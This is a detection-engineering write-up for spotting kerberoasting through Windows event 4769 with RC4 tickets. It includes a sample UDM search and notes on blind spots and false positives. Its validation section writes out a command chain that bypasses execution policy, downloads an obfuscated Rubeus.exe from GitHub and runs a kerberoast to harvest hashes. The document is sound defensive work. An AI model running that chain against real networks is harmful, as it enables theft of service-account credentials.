# Detection Name

kerberoasting_abuse.yaral

# Goal
Detect attempts by a threat actor to enumerate SPN's and harvest weak passwords from service accounts via kerberoasting.

# Categorization
These attempts are categorized as [Credential Access / Steal or Forge Kerberos Tickets / Kerberoasting](https://attack.mitre.org/techniques/T1558/003/).

# Detection Functionality
The detection will work as follows:

* Record Windows Event logs
* Look for Windows EventID 4769
* Identify where the Encryption Type is 0x17
* Suppress known-good service accounts
  * Accounts ending with $
  * Known source users that run tools that enumerate SPN's
* Fire alert when the above conditions are met

# Blind Spots and Assumptions

This strategy relies on the following assumptions: 
* Windows Event Logs are logging properly without missing telemetry
* Logs are flowing to the SIEM in a reasonable timeframe
* SIEM is parsing the fields properly to map the detection logic

A blind spot will occur if any of the assumptions are violated. For instance, the following would not trip the alert: 
* Other Encryption Types (such as 0x12) being hit instead of 0x17 (RC4)
* SPN's are cached and the alert doesn't fire due to cached responses

# False Positives
There are several instances where false positives for this ADS could occur:

* Users explicitly performing SPN enumeration as part of SQL jobs
* Automated internal red-team testing

Most false positives can be tracked back to DBA's running scritps that enumerate SPN's and red team activity.

# Validation
Validation can occur by utilize Rubeus.exe to enumerate SPN's and harvest weak RC4 hashes.
```
%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe Set-ExecutionPolicy Bypass -scope Process -Force; %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri "https://github.com/Flangvik/ObfuscatedSharpCollection/raw/main/NetFramework_4.7_Any/Rubeus.exe._obf.exe" -OutFile "C:\ProgramData\Rubeus.exe"; C:\Windows\System32\cmd.exe /C C:\ProgramData\Rubeus.exe kerberoast
```
# Relevance
Althought many environments no logner have weak RC4 hashes to easily get roasted, it is still a good detection to have to cover this attack vector. It is one of the easiest ways to compromise an elevated priileged account and allow an attacker to pivot to domain compromise.

# Priority
If this detection can be tuned properly, the severity should be a Critical with a 100 risk score.

# Search Example
This is a base UDM search to start with, finer tuning is required to move this into a detection and hone in the proper encryption types.
```
metadata.vendor_name = "Microsoft" AND metadata.product_event_type = "4769" AND principal.hostname = "win-dc.hack.domain" 
(target.resource.name = "0x40800000" OR target.resource.name = "0x40810000")
(target.resource.resource_subtype = "0x12" OR target.resource.resource_subtype = "0x17")
```